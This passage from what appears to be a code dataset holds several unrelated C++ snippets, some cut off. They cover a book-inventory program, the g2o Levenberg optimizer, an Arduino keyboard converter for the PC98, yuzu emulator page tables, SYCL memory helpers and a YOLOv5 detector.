lbls.push_back(static_cast<size_t>(0));\n                // Create non factory object in class to continue classify\n\n                without_factories->amenities_density.push_back(prepared_bds->amenities_density.at(i));\n                without_factories->bc_buildings.push_back(prepared_bds->bc_buildings.at(i));\n                without_factories->building_type_vec.push_back(prepared_bds->building_type_vec.at(i));\n                without_factories->cc_buildings.push_back(prepared_bds->cc_buildings.at(i));\n                without_factories->distance_to_center.push_back(prepared_bds->distance_to_center.at(i));\n                without_factories->genplan_categ.push_back(prepared_bds->genplan_categ.at(i));\n                without_factories->levels.push_back(prepared_bds->levels.at(i));\n                without_factories->ogr_poly_vec.push_back(prepared_bds->ogr_poly_vec.at(i));\n                without_factories->osm_id_vec.push_back(prepared_bds->osm_id_vec.at(i));\n\n        ",
    "#include <bits/stdc++.h>\n\nusing namespace std;\nclass Book\n{\nprotected:\n    int id;\n    string title;\n    string author;\n    int quantity;\n\npublic:\n    Book() : id(0), title(\"\"), author(\"\"), quantity(0) {}\n\n    Book(int id, string title, string author, int quantity) : id(id), title(title), author(author), quantity(quantity) {}\n\n    int getNextAvailableId()\n    {\n        ifstream file(\"books.txt\");\n        if (file.is_open())\n        {\n            int lineCount = 0;\n            string line;\n            while (getline(file, line))\n            {\n                lineCount++;\n            }\n            file.close();\n            return lineCount + 1; // id l\u00e0 d\u00f2ng ti\u1ebfp theo sau khi \u0111\u00e3 \u0111\u1ebfm \u0111\u01b0\u1ee3c s\u1ed1 d\u00f2ng\n        }\n        return 1; // Tr\u1ea3 v\u1ec1 1 n\u1ebfu kh\u00f4ng m\u1edf \u0111\u01b0\u1ee3c file\n    }\n\n    void addBook()\n    {\n        id = getNextAvailableId(); // G\u00e1n id l\u00e0 id b\u00e9 nh\u1ea5t ch\u01b0a xu\u1ea5t hi\u1ec7n\n        cout << \"Enter title: \";\n        getline(cin, title);\n        cout << \"Enter author: \";\n        getline(cin, author);\n        cout << \"Enter quantity: \";\n        cin >> quantity;\n\n        // Ki\u1ec3m tra v\u00e0 ghi v\u00e0o file\n        ofstream file(\"books.txt\", ios::app);\n        if (file.is_open())\n        {\n            file << \"[\" << id << \"] \"\n                 << \"[\" << title << \"] \"\n                 << \"[\" << author << \"] \"\n                 << \"[\" << quantity << \"] \" << endl;\n            file.close();\n            cout << \"Add Done\\n\";\n        }\n        else\n        {\n            cout << \"Error!\\n\";\n        }\n    }\n\n    void getBooks()\n    {\n        ifstream file(\"books.txt\");\n        if (file.is_open())\n        {\n            string line;\n            while (getline(file, line))\n            {\n                cout << line << endl;\n            }\n            file.close();\n        }\n        else\n        {\n            cout << \"Unable to open file.\\n\";\n        }\n    }\n    //     void updateBook(int id)\n    //     {\n\n    //     }\n    //     void deleteBook(int id)\n    //     {\n\n    //     }\n};\n\nclass EBook : public Book\n{\nprotected:\n    string fileFormat;\n    int fileSize;\n\npublic:\n    EBook() : Book(), fileFormat(\"\"), fileSize(0) {}\n\n    EBook(string title, string author, int quantity, string fileFormat, int fileSize)\n        : Book(id, title, author, quantity), fileFormat(fileFormat), fileSize(fileSize) {}\n\n    void addBook()\n    {\n        id = getNextAvailableId(); // G\u00e1n id l\u00e0 d\u00f2ng ti\u1ebfp theo trong file\n        cout << \"Enter title: \";\n        cin.ignore();\n        getline(cin, title);\n        cout << \"Enter author: \";\n        getline(cin, author);\n        cout << \"Enter quantity: \";\n        cin >> quantity;\n        cout << \"Enter file format: \";\n        cin.ignore();\n        getline(cin, fileFormat);\n        cout << \"Enter file size: \";\n        cin >> fileSize;\n\n        // Ki\u1ec3m tra v\u00e0 ghi v\u00e0o file\n        ofstream file(\"books.txt\", ios::app);\n        if (file.is_open())\n        {\n            file << \"[\" << id << \"] \"\n                 << \"[\" << title << \"] \"\n                 << \"[\" << author << \"] \"\n                 << \"[\" << quantity << \"] \"\n                 << \"[\" << fileFormat << \"] \"\n                 << \"[\" << fileSize << \"] \" << endl;\n            file.close();\n            cout << \"Ebook add done!\\n\";\n        }\n        else\n        {\n            cout << \"Error!\\n\";\n        }\n    }\n};\n\nint main()\n{\n    Book book;\n    book.addBook(); // Th\u00eam m\u1ed9t s\u00e1ch v\u00e0o file books.txt\n    // book.getBooks(); // Hi\u1ec3n th\u1ecb th\u00f4ng tin s\u00e1ch trong file books.txt\n\n    EBook ebook;\n    ebook.addBook(); // Th\u00eam m\u1ed9t s\u00e1ch \u0111i\u1ec7n t\u1eed v\u00e0o file books.txt\n\n    return 0;\n}\n",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 R. Kuemmerle, G. Grisetti, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n// Modified Raul Mur Artal (2014)\n// - Stop criterium (solve function)\n\n#include \"optimization_algorithm_levenberg.h\"\n\n#include <iostream>\n\n#include \"../stuff/timeutil.h\"\n\n#include \"sparse_optimizer.h\"\n#include \"solver.h\"\n#include \"batch_stats.h\"\nusing namespace std;\n\nnamespace g2o {\n\n  OptimizationAlgorithmLevenberg::OptimizationAlgorithmLevenberg(Solver* solver) :\n    OptimizationAlgorithmWithHessian(solver)\n  {\n    _currentLambda = -1.;\n    _tau = 1e-5; // Carlos: originally 1e-5\n    _goodStepUpperScale = 2./3.;\n    _goodStepLowerScale = 1./3.;\n    _userLambdaInit = _properties.makeProperty<Property<double> >(\"initialLambda\", 0.);\n    _maxTrialsAfterFailure = _properties.makeProperty<Property<int> >(\"maxTrialsAfterFailure\", 10); // Carlos: Originally 10 iterations\n    _ni=2.;\n    _levenbergIterations = 0;\n    _nBad = 0;\n  }\n\n  OptimizationAlgorithmLevenberg::~OptimizationAlgorithmLevenberg()\n  {\n  }\n\n  OptimizationAlgorithm::SolverResult OptimizationAlgorithmLevenberg::solve(int iteration, bool online)\n  {\n    assert(_optimizer && \"_optimizer not set\");\n    assert(_solver->optimizer() == _optimizer && \"underlying linear solver operates on different graph\");\n\n    if (iteration == 0 && !online) { // built up the CCS structure, here due to easy time measure\n      bool ok = _solver->buildStructure();\n      if (! ok) {\n        cerr << __PRETTY_FUNCTION__ << \": Failure while building CCS structure\" << endl;\n        return OptimizationAlgorithm::Fail;\n      }\n    }\n\n    double t=get_monotonic_time();\n    _optimizer->computeActiveErrors();\n    G2OBatchStatistics* globalStats = G2OBatchStatistics::globalStats();\n    if (globalStats) {\n      globalStats->timeResiduals = get_monotonic_time()-t;\n      t=get_monotonic_time();\n    }\n\n    double currentChi = _optimizer->activeRobustChi2();\n    double tempChi=currentChi;\n\n    double iniChi = currentChi;\n\n    _solver->buildSystem();\n    if (globalStats) {\n      globalStats->timeQuadraticForm = get_monotonic_time()-t;\n    }\n\n    // core part of the Levenbarg algorithm\n    if (iteration == 0) {       \n      _currentLambda = computeLambdaInit();\n      _ni = 2;\n      _nBad = 0;\n    }\n\n    double rho=0;\n    int& qmax = _levenbergIterations;\n    qmax = 0;\n    do {\n      _optimizer->push();\n      if (globalStats) {\n        globalStats->levenbergIterations++;\n        t=get_monotonic_time();\n      }\n      // update the diagonal of the system matrix\n      _solver->setLambda(_currentLambda, true);\n      bool ok2 = _solver->solve();\n      if (globalStats) {\n        globalStats->timeLinearSolution+=get_monotonic_time()-t;\n        t=get_monotonic_time();\n      }\n      _optimizer->update(_solver->x());\n      if (globalStats) {\n        globalStats->timeUpdate = get_monotonic_time()-t;\n      }\n\n      // restore the diagonal\n      _solver->restoreDiagonal();\n\n      _optimizer->computeActiveErrors();\n      tempChi = _optimizer->activeRobustChi2();\n      // cout << \"tempChi: \" << tempChi << endl;\n      if (! ok2)\n        tempChi=std::numeric_limits<double>::max();\n\n      rho = (currentChi-tempChi);\n      double scale = computeScale();\n      scale += 1e-3; // make sure it's non-zero :)\n      rho /=  scale;\n\n      if (rho>0 && g2o_isfinite(tempChi)){ // last step was good\n        double alpha = 1.-pow((2*rho-1),3);\n        // crop lambda between minimum and maximum factors\n        alpha = (std::min)(alpha, _goodStepUpperScale);\n        double scaleFactor = (std::max)(_goodStepLowerScale, alpha);\n        _currentLambda *= scaleFactor;\n        _ni = 2;\n        currentChi=tempChi;\n        _optimizer",
    "//---------------------------------------------------------------------\r\n// USB/Keyboard(Japanese) to PC98 Keyboard\r\n// \r\n// (Arduino Pro Mini 8MHz)\r\n// \u30fbUSB_Host_Shield_2.0 (https://github.com/felis/USB_Host_Shield_2.0)\r\n// \u30fbMsTimer2 (http://playground.arduino.cc/Main/MsTimer2)\r\n//\r\n// minidin8P   --  Arduino Pro Mini\r\n//  1 RST      --  1(D1)\r\n//  2 GND      --  GND\r\n//  3 RDY      --  \r\n//  4 RxD      --  2(D0)\r\n//  5 RTY      --  \r\n//  6          --  \r\n//  7          --  \r\n//  8 Vcc(+5V) --  Vcc(+5V)\r\n//\r\n// minidin9P   --  Arduino Pro Mini\r\n//  1 Vcc(+5V) --  \r\n//  2 XA       --  6(D3)\r\n//  3 XB       --  7(D4)\r\n//  4 YA       --  8(D5)\r\n//  5 YB       --  9(D6)\r\n//  6 L        --  10(D7)\r\n//  7 M        --  \r\n//  8 R        --  11(D8)\r\n//  9 GND      --  \r\n//---------------------------------------------------------------------\r\n#include <hidboot.h>\r\n#include <usbhub.h>\r\n#include <MsTimer2.h>\r\n#include \"keymap.h\"\r\n\r\n// DEBUG\r\n#define DEBUG       0     // 0:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u306a\u3057 1:\u30c7\u30d0\u30c3\u30b0\u60c5\u5831\u51fa\u529b\u3042\u308a\r\n#define LOBYTE(x) ((char*)(&(x)))[0]\r\n#define HIBYTE(x) ((char*)(&(x)))[1]\r\n\r\n// GPIO\r\n#define MS_XA       3     // Mouse XA\r\n#define MS_XB       4     // Mouse XB\r\n#define MS_YA       5     // Mouse YA\r\n#define MS_YB       6     // Mouse YB\r\n#define MS_LB       7     // Mouse LB\r\n#define MS_RB       8     // Mouse RB\r\n#define LED        13     // \u5185\u8535LED\r\n\r\n// \u5909\u6570\r\nvolatile uint8_t sCode = 0xff;          // \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile uint8_t prevScode = 0xff;      // \u524d\u56de\u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9\r\nvolatile int16_t sCodeCnt = 0;          // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u56de\u6570\r\nvolatile int16_t delayTime = 500;       // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u958b\u59cb(\u521d\u671f\u5024500ms)\r\nvolatile int16_t repeatTime = 110;      // \u30ad\u30fc\u30ea\u30d4\u30fc\u30c8\u9593\u9694(\u521d\u671f\u5024110ms)\r\n\r\nvolatile int16_t XYlimit = 256;         // \u30de\u30a6\u30b9\u30ea\u30df\u30c3\u30c8\u5024\r\nvolatile int16_t xState = 0;            // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(X)\r\nvolatile int16_t ySstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(Y)\r\nvolatile int16_t bSstate = 0;           // \u30de\u30a6\u30b9\u30b9\u30c6\u30fc\u30bf\u30b9(B)\r\n\r\nvoid sendRepeat();\r\n//\r\n// HID\u30ad\u30fc\u30dc\u30fc\u30c9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass KbdRptParser : public KeyboardReportParser {\r\n  protected:\r\n    void OnControlKeysChanged(uint8_t before, uint8_t after);\r\n    void OnKeyDown(uint8_t mod, uint8_t key);\r\n    void OnKeyUp(uint8_t mod, uint8_t key);\r\n    void OnKeyPressed(uint8_t key) {};\r\n};\r\n\r\n//\r\n// HID\u30de\u30a6\u30b9 \u30ec\u30dd\u30fc\u30c8\u30d1\u30fc\u30b5\u30fc\u30af\u30e9\u30b9\u306e\u5b9a\u7fa9\r\n//\r\nclass MseRptParser : public MouseReportParser {\r\n  protected:\r\n    void OnMouseMove(MOUSEINFO *mi);\r\n    void OnLeftButtonUp(MOUSEINFO *mi);\r\n    void OnLeftButtonDown(MOUSEINFO *mi);\r\n    void OnRightButtonUp(MOUSEINFO *mi);\r\n    void OnRightButtonDown(MOUSEINFO *mi);\r\n};\r\n\r\n//\r\n// PC98 make\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u62bc\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyMake(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt++;\r\n  prevScode = code;\r\n#if DEBUG\r\n  Serial.print(F(\"UP2[\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code);\r\n  sCode = code;\r\n  MsTimer2::set(delayTime, sendRepeat);\r\n  MsTimer2::start();\r\n}\r\n\r\n//\r\n// PC98 break\u30b3\u30fc\u30c9\u9001\u4fe1(\u30ad\u30fc\u96e2\u3057)\r\n// \u5f15\u6570 key(IN) HID Usage ID\r\n//\r\nvoid sendKeyBreak(uint8_t key) {\r\n  // HID Usage ID \u304b\u3089 PC98 \u30b9\u30ad\u30e3\u30f3\u30b3\u30fc\u30c9 \u306b\u5909\u63db\r\n  uint8_t code = 0;\r\n  code = pgm_read_byte(&(keytable98[key]));\r\n  if (code == 0xff) {\r\n    return;\r\n  }\r\n  sCodeCnt--;\r\n  if (prevScode == code) {\r\n    sCode = 0xff;\r\n  }\r\n#if DEBUG\r\n  Serial.print(F(\"DN [\"));  Serial.print(F(\"key=\"));  Serial.print(key, HEX);\r\n  Serial.print(F(\" code=\"));  Serial.print(code, HEX);  Serial.println(F(\"]\"));\r\n#endif\r\n  // PC98\u30ad\u30fc\u306e\u767a\u884c\u30ad\u30fc\u306e\u767a\u884c\r\n  Serial.write(code | 0x80);\r\n  if (sCodeCnt == 0) {\r\n    MsTimer2::stop();\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9\u30dc\u30bf\u30f3\r\n//\r\nvoid updateMouseBtn() {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"bSstate = \");\r\n  Serial.println(bSstate,HEX);\r\n#endif\r\n  // \u30dc\u30bf\u30f3\u306e\u5224\u5b9a\r\n  switch (bSstate) {\r\n    case 0x00:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x01:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, INPUT);\r\n      break;\r\n    case 0x02:\r\n      pinMode(MS_LB, INPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n    case 0x03:\r\n      pinMode(MS_LB, OUTPUT);\r\n      pinMode(MS_RB, OUTPUT);\r\n      break;\r\n  }\r\n}\r\n\r\n//\r\n// \u30a2\u30c3\u30d7\u30c7\u30fc\u30c8\u30de\u30a6\u30b9X\r\n//\r\nvoid updateMouseX(bool di) {\r\n#ifdef DEBUG_MOUSE\r\n  Serial.print(\"xState = \");\r\n  Serial.println(xState,HEX);\r\n#endif\r\n  if (di) {\r\n    //+\u65b9\u5411(\u53f3\u65b9\u5411) 0->1->3->2\r\n    if (xState == 0) {\r\n      xState = 1;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else if (xState == 1) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OUTPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 3) {\r\n      xState = 2;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, OUTPUT);\r\n    } else if (xState == 2) {\r\n      xState = 0;\r\n      pinMode(MS_XA, INPUT);\r\n      pinMode(MS_XB, INPUT);\r\n    } else {\r\n      xState = 0;\r\n    }\r\n  } else {\r\n    //-\u65b9\u5411(\u5de6\u65b9\u5411) 2->3->1->0\r\n    if (xState == 2) {\r\n      xState = 3;\r\n      pinMode(MS_XA, OU",
    "// SPDX-FileCopyrightText: Copyright 2023 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/scope_exit.h\"\n#include \"common/settings.h\"\n#include \"core/core.h\"\n#include \"core/hle/kernel/k_address_space_info.h\"\n#include \"core/hle/kernel/k_page_table_base.h\"\n#include \"core/hle/kernel/k_scoped_resource_reservation.h\"\n#include \"core/hle/kernel/k_system_resource.h\"\n\nnamespace Kernel {\n\nnamespace {\n\nclass KScopedLightLockPair {\n    YUZU_NON_COPYABLE(KScopedLightLockPair);\n    YUZU_NON_MOVEABLE(KScopedLightLockPair);\n\nprivate:\n    KLightLock* m_lower;\n    KLightLock* m_upper;\n\npublic:\n    KScopedLightLockPair(KLightLock& lhs, KLightLock& rhs) {\n        // Ensure our locks are in a consistent order.\n        if (std::addressof(lhs) <= std::addressof(rhs)) {\n            m_lower = std::addressof(lhs);\n            m_upper = std::addressof(rhs);\n        } else {\n            m_lower = std::addressof(rhs);\n            m_upper = std::addressof(lhs);\n        }\n\n        // Acquire both locks.\n        m_lower->Lock();\n        if (m_lower != m_upper) {\n            m_upper->Lock();\n        }\n    }\n\n    ~KScopedLightLockPair() {\n        // Unlock the upper lock.\n        if (m_upper != nullptr && m_upper != m_lower) {\n            m_upper->Unlock();\n        }\n\n        // Unlock the lower lock.\n        if (m_lower != nullptr) {\n            m_lower->Unlock();\n        }\n    }\n\npublic:\n    // Utility.\n    void TryUnlockHalf(KLightLock& lock) {\n        // Only allow unlocking if the lock is half the pair.\n        if (m_lower != m_upper) {\n            // We want to be sure the lock is one we own.\n            if (m_lower == std::addressof(lock)) {\n                lock.Unlock();\n                m_lower = nullptr;\n            } else if (m_upper == std::addressof(lock)) {\n                lock.Unlock();\n                m_upper = nullptr;\n            }\n        }\n    }\n};\n\ntemplate <typename AddressType>\nvoid InvalidateInstructionCache(KernelCore& kernel, KPageTableBase* table, AddressType addr,\n                                u64 size) {\n    // TODO: lock the process list\n    for (auto& process : kernel.GetProcessList()) {\n        if (std::addressof(process->GetPageTable().GetBasePageTable()) != table) {\n            continue;\n        }\n\n        for (size_t i = 0; i < Core::Hardware::NUM_CPU_CORES; i++) {\n            auto* interface = process->GetArmInterface(i);\n            if (interface) {\n                interface->InvalidateCacheRange(GetInteger(addr), size);\n            }\n        }\n    }\n}\n\nvoid ClearBackingRegion(Core::System& system, KPhysicalAddress addr, u64 size, u32 fill_value) {\n    system.DeviceMemory().buffer.ClearBackingRegion(GetInteger(addr) - Core::DramMemoryMap::Base,\n                                                    size, fill_value);\n}\n\ntemplate <typename AddressType>\nResult InvalidateDataCache(AddressType addr, u64 size) {\n    R_SUCCEED();\n}\n\ntemplate <typename AddressType>\nResult StoreDataCache(AddressType addr, u64 size) {\n    R_SUCCEED();\n}\n\ntemplate <typename AddressType>\nResult FlushDataCache(AddressType addr, u64 size) {\n    R_SUCCEED();\n}\n\nconstexpr Common::MemoryPermission ConvertToMemoryPermission(KMemoryPermission perm) {\n    Common::MemoryPermission perms{};\n    if (True(perm & KMemoryPermission::UserRead)) {\n        perms |= Common::MemoryPermission::Read;\n    }\n    if (True(perm & KMemoryPermission::UserWrite)) {\n        perms |= Common::MemoryPermission::Write;\n    }\n#ifdef HAS_NCE\n    if (True(perm & KMemoryPermission::UserExecute)) {\n        perms |= Common::MemoryPermission::Execute;\n    }\n#endif\n    return perms;\n}\n\n} // namespace\n\nvoid KPageTableBase::MemoryRange::Open() {\n    // If the range contains heap pages, open them.\n    if (this->IsHeap()) {\n        m_kernel.MemoryManager().Open(this->GetAddress(), this->GetSize() / PageSize);\n    }\n}\n\nvoid KPageTableBase::MemoryRange::Close() {\n    // If the range contains heap pages, close them.\n    if (this->IsHeap()) {\n        m_kernel.MemoryManager().Close(this->GetAddress(), this->GetSize() / PageSize);\n    }\n}\n\nKPageTableBase::KPageTableBase(KernelCore& kernel)\n    : m_kernel(kernel), m_system(kernel.System()), m_general_lock(kernel),\n      m_map_physical_memory_lock(kernel), m_device_map_lock(kernel) {}\nKPageTableBase::~KPageTableBase() = default;\n\nResult KPageTableBase::InitializeForKernel(bool is_64_bit, KVirtualAddress start,\n                                           KVirtualAddress end, Core::Memory::Memory& memory) {\n    // Initialize our members.\n    m_address_space_width =\n        static_cast<u32>(is_64_bit ? Common::BitSize<u64>() : Common::BitSize<u32>());\n    m_address_space_start = KProcessAddress(GetInteger(start));\n    m_address_space_end = KProcessAddress(GetInteger(end));\n    m_is_kernel = true;\n    m_enable_aslr = true;\n    m_enable_device_address_space_merge = false;\n\n    m_heap_region_start = 0;\n    m_heap_region_end = 0;\n    m_current_heap_end = 0;\n    m_alias_region_start = 0;\n    m_alias_region_end",
    "#include \"BasicKernel.h\"\n\n#ifdef _DEBUG\n#include <string>\n#include <iostream>\n#endif // _DEBUG\n\n/// <summary>\n/// \u521b\u5efa\u8ba1\u7b97\u961f\u5217\n/// </summary>\n/// <returns></returns>\nsycl::queue* CreateDPCQueue()\n{\n\t// \u6839\u636e\u9ed8\u8ba4\u7684\u8bbe\u5907\u9009\u62e9\u5668\u521b\u5efa\u961f\u5217\n\tsycl::queue* pstRetQueue = new(std::nothrow) sycl::queue(sycl::default_selector_v);\n\tif (pstRetQueue == nullptr) return nullptr;\n\n#ifdef _DEBUG\n\tstd::string strDeviceClassName;\n\tif (pstRetQueue->get_device().is_cpu()) strDeviceClassName.assign(\"CPU\");\n\telse if (pstRetQueue->get_device().is_gpu()) strDeviceClassName.assign(\"GPU\");\n\telse strDeviceClassName.assign(\"\u5176\u4ed6\u8bbe\u5907\");\n\tstd::cout << \"\u8bbe\u5907\u7c7b\u578b: \" << strDeviceClassName << std::endl\n\t\t<< \"\u8bbe\u5907\u540d\u79f0: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::name>()\n\t\t<< std::endl << \"\u8bbe\u5907\u5185\u5b58: \" <<\n\t\tpstRetQueue->get_device().get_info<sycl::info::device::global_mem_size>() / 1024.0 / 1024.0 / 1024.0 << \"GB\"\n\t\t<< std::endl << \"WorkGroup\u672c\u5730\u5185\u5b58: \" << pstRetQueue->get_device().get_info<sycl::info::device::local_mem_size>() / 1024.0 << \"KB\"\n\t\t<< std::endl << \"\u6700\u5927\u5de5\u4f5c\u7ec4\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_group_size>()\n\t\t<< std::endl << \"\u5de5\u4f5c\u7ec4\u4e0b\u7684\u6700\u5927\u5de5\u4f5c\u9879\u6570: \"\n\t\t<< pstRetQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() << std::endl;\n#endif // _DEBUG\n\n\treturn pstRetQueue;\n}\n\n/// <summary>\n/// \u83b7\u53d6\u6700\u5927\u5de5\u4f5c\u9879\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetMaxWorkItemSizes(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::max_work_item_sizes<1>>().size() : (size_t)0);\n}\n\n/// <summary>\n/// \u83b7\u53d6\u8ba1\u7b97\u6838\u5fc3\u7684\u672c\u5730\u5185\u5b58\u5927\u5c0f\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <returns></returns>\nsize_t GetLoaclMemorySize(sycl::queue* pstDPCQueue)\n{\n\treturn (pstDPCQueue != nullptr ? pstDPCQueue->get_device().get_info<sycl::info::device::local_mem_size>() : (size_t)0);\n}\n\n/// <summary>\n/// \u5206\u914d\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"nSize\"></param>\n/// <param name=\"eMemoryAlloc\"></param>\n/// <returns></returns>\nValueType* Malloc(sycl::queue* pstDPCQueue, int nSize, EMemoryAlloc eMemoryAlloc)\n{\n\tif (pstDPCQueue == nullptr || nSize <= 0) return nullptr;\n\n\tValueType* nRet = nullptr;\n\ttry\n\t{\n\t\tswitch (eMemoryAlloc)\n\t\t{\n\t\tcase Host:\n\t\t\tnRet = sycl::malloc_host<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Device:\n\t\t\tnRet = sycl::malloc_device<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tcase Shared:\n\t\t\tnRet = sycl::malloc_shared<ValueType>(nSize, *pstDPCQueue);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t}\n\tcatch (const std::exception&)\n\t{\n\t\treturn nullptr;\n\t}\n\n\treturn nRet;\n}\n\n/// <summary>\n/// \u91ca\u653e\u5185\u5b58\n/// </summary>\n/// <param name=\"pstDPCQueue\"></param>\n/// <param name=\"pData\"></param>\nvoid Free(sycl::queue* pstDPCQueue, ValueType* pData)\n{\n\tif (pstDPCQueue != nullptr && pData != nullptr)\n\t{\n\t\tsycl::free(pData, *pstDPCQueue);\n\t}\n}\n",
    "#include <utils.h>\n\ncv::dnn::Net Yolov5Detector::loadNet(const string modelPath, bool is_cuda = false)\n{\n    cv::dnn::dnn4_v20211004::Net model = cv::dnn::readNet(modelPath);\n    if (is_cuda)\n    {\n        cout << \"Attempty to use CUDA\\n\";\n        model.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\n        model.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\n    }\n    else\n    {\n        cout << \"Running on CPU\\n\";\n        model.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\n        model.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\n    }\n    return model;\n}\n\nvector<string> Yolov5Detector::loadClassesList(const string filePath)\n{\n    vector<string> class_list;\n    ifstream ifs(filePath);\n    string line;\n    while (getline(ifs, line))\n    {\n        class_list.push_back(line);\n    }\n    return class_list;\n}\n\ncv::Mat Yolov5Detector::format2Yolov5(const cv::Mat source)\n{\n    int col = source.cols;\n    int row = source.rows;\n    int _max = MAX(col, row);\n    cv::Mat result = cv::Mat::zeros(_max, _max, CV_8UC3);\n    source.copyTo(result(cv::Rect(0, 0, col, row)));\n    return result;\n}\n\nYolov5Detector::Yolov5Detector(const string modelPath, const string classesFilePath, const bool useGPU)\n{\n    this->net = this->loadNet(modelPath, useGPU);\n    this->classNames = this->loadClassesList(classesFilePath);\n}\n\nYolov5Detector::DetectionData Yolov5Detector::detect(cv::Mat image, const bool draw)\n{\n    cv::Mat blob;\n\n    cv::Mat input_image = this->format2Yolov5(image);\n\n    cv::dnn::blobFromImage(input_image, blob, 1. / 255., cv::Size(INPUT_WIDTH, INPUT_HEIGHT), cv::Scalar(), true,\n                           false);\n\n    this->net.setInput(blob);\n    vector<cv::Mat> outputs;\n    this->net.forward(outputs, this->net.getUnconnectedOutLayersNames());\n\n    float x_factor = input_image.cols / INPUT_WIDTH;\n    float y_factor = input_image.rows / INPUT_HEIGHT;\n\n    float *data = (float *)outputs[0].data;\n\n    const int dimensions = 85;\n    const int rows = 25200;\n\n    vector<int> class_ids;\n    vector<float> confidences;\n    vector<cv::Rect> boxes;\n\n    for (int i = 0; i < rows; ++i)\n    {\n        float confidence = data[4];\n        if (confidence >= CONFIDENCE_THRESHOLD)\n        {\n            float *classes_scores = data + 5;\n            cv::Mat scores(1, this->classNames.size(), CV_32FC1, classes_scores);\n            cv::Point class_id;\n            double max_class_score;\n            minMaxLoc(scores, 0, &max_class_score, 0, &class_id);\n            if (max_class_score > SCORE_THRESHOLD)\n            {\n                confidences.push_back(confidence);\n                class_ids.push_back(class_id.x);\n\n                float x = data[0];\n                float y = data[1];\n                float w = data[2];\n                float h = data[3];\n                // Width, height and x,y coordinates of bounding box\n\n                int x1 = int((x - 0.5 * w) * x_factor);\n                int y1 = int((y - 0.5 * h) * y_factor);\n                int x2 = int(w * x_factor);\n                int y2 = int(h * y_factor);\n                boxes.push_back(cv::Rect(x1, y1, x2, y2));\n            }\n        }\n        data += 85;\n    }\n\n    